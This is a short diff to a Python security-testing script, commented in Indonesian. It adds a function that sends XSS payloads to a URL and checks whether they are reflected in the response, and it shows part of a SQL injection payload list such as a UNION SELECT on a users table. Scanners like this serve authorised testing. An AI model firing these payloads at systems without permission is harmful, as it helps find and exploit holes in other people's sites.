@@ -89,3 +89,15 @@ sql_payloads = [
     "\") union select * from users--"
 ]
 
+# Fungsi untuk menguji kerentanan XSS
+def test_xss(url):
+    print(f"Menguji {url} untuk kerentanan XSS...")
+    for payload in xss_payloads:
+        # Mengirimkan permintaan dengan payload XSS
+        response = requests.get(url, params={'input': payload})
+        # Memeriksa apakah payload tercermin dalam respons
+        if payload in response.text:
+            print(f"Potensi kerentanan XSS terdeteksi dengan payload: {payload}")
+            return True
+    print("Tidak ada kerentanan XSS yang terdeteksi.")
+    return False
